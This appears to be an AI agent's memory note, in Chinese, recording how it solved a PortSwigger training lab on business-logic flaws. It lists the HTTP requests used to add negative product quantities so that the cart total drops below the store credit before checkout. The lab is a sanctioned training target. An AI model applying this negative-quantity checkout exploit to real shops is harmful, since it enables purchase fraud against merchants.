---
metadata:
  node_type: memory
name: "PRS arm A logic-flaws high-level"
description: "arm A 基线:lab-logic-flaws-high-level 冷实例一次通过 - 负数量抵消夹克价到 $97.86(credit $100)后下单"
last_updated: 2026-10-08T21:15:59+08:00
created: 2026-10-08T21:15:59+08:00
---

# PRS arm A baseline — lab-logic-flaws-high-level

日期:2026-10-08(会话内)。臂:arm A 基线。冷实例(reused:false),一次通过,solved。

## 实例与发射

- 真实 slug = `/web-security/logic-flaws/examples/lab-logic-flaws-high-level`(标题 "High-level logic vulnerability");
  两处直觉猜测(去 examples、lab-high-level-logic-vulnerability)都 404,**不要猜 slug**。
- widget-lab-id = `8593E55B788D1C4403CCAD45020972079A8E89C5669ECF6D9BE2CD5C69C77877`。
- 不猜 slug 的省事办法:POST `https://portswigger.net/api/widgets`,体
  `[{"widgetId":"academy-labstatus","additionalData":{"widget-lab-id":"<id>"}}]`,头
  `Content-Type: application/json` + `Widget-Source: /web-security/`;回包 HTML 里带
  `<a href="/web-security/logic-flaws/examples/...">标题</a>`,并且不需要登录、不需要 launch。
  (all-labs 页只给一串 widget-lab-id,不给名称/链接;topic 页也不给。)
- `range_launch launch <id> --jar /tmp/cj1.json` → base `https://0afd000104ea745780e812c500e7009c.web-security-academy.net/`,reused:false。

## 复现链(全走件)

1. `page_read` 取描述与 lab_id → `range_launch` 起实例。
2. `http_session get /login` → csrf;`post /login`(wiener/peter) → 302 /my-account。
3. `get /product?productId=1` 读加购表单(action=/cart, 字段 productId/redir/quantity, **无 csrf**)。
4. `post /cart`(productId=1,redir=PRODUCT,quantity=1)加夹克 $1337;`get /cart` 显示 credit $100。
5. `post /cart`(productId=3,redir=CART,quantity=-400)→ 总价 -$147.00(数量可为负,服务端不校验)。
6. `post /cart/checkout` → **303 `/cart?err=NEGATIVE_TOTAL`**(负总价被拒,这是唯一判据坑)。
7. `post /cart`(productId=3,redir=CART,quantity=66)→ 数量 -334 → 总价 $97.86 ≤ credit。
8. `post /cart/checkout`(csrf 取自 /cart 页) → 303 `/cart/order-confirmation?order-confirmed=true`。
9. `get /cart/order-confirmation?order-confirmed=true` → `<section class='academyLabBanner is-solved'>` + `<h4>Congratulations, you solved the lab!</h4>`。

## 发现与陷阱

- cart 的 quantity 是**增量**(页面 +/- 表单发 ±1),不是置值;要造负总价就用加购表单直接投大负数量。
- 判 solved 看确认页:**`banner_verdict` 读 "/" 两次都返回 solved:false**(首页是缓存/渲染面),确认页才带 is-solved 与 congrats——此题不能用 "/" 的 banner 当锚。
- 件族足够(range_launch / http_session / text_grep / html_text / nap / banner_verdict),无新件需求。

